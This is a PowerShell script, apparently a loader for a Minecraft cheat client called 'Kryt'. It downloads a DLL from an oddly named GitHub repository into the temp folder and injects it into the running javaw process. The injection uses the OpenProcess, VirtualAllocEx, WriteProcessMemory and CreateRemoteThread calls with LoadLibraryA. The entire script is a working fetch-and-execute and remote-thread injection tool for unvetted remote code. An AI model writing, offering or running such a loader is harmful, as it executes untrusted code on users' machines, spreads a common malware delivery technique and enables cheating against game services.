$dllUrl = "https://github.com/dsdfdcvdcwcwcdw/dsadsadasdsaadasdsa/raw/main/krytregii.dll"
$dllPath = "$env:TEMP\k6_fixed.dll"
$procName = "javaw"

# Download the DLL
Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing

$s = @'
[DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint p);
[DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string m);
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
[DllImport("kernel32.dll")] public static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr ta, uint s, IntPtr sa, IntPtr p, uint c, IntPtr tid);
'@

$k = Add-Type -MemberDefinition $s -Name "W32" -Namespace "K" -PassThru
$p = Get-Process $procName -ErrorAction SilentlyContinue

if (!$p) { 
    Write-Host "Minecraft not found! Open the game first." -ForegroundColor Red
    pause; exit 
}

$h = $k::OpenProcess(0x1F0FFF, $false, $p.Id)
$l = $k::GetProcAddress($k::GetModuleHandle("kernel32.dll"), "LoadLibraryA")
$m = $k::VirtualAllocEx($h, [IntPtr]::Zero, [uint32]$dllPath.Length, 0x3000, 0x40)
$b = [System.Text.Encoding]::ASCII.GetBytes($dllPath)
$o = 0
$k::WriteProcessMemory($h, $m, $b, [uint32]$b.Length, [ref]$o)

# --- THE FIX ---
Write-Host "Ready to inject. STAND STILL in a lobby/singleplayer world." -ForegroundColor Yellow
Start-Sleep -Seconds 3 # Wait for render thread to be calm

$k::CreateRemoteThread($h, [IntPtr]::Zero, 0, $l, $m, 0, [IntPtr]::Zero)

Write-Host "DLL Injected! Waiting for stabilization..." -ForegroundColor Cyan
Start-Sleep -Seconds 5 # Keep the script alive so the thread doesn't orphan immediately

Write-Host "Kryt Loaded! Check for the CMD window in-game." -ForegroundColor Green
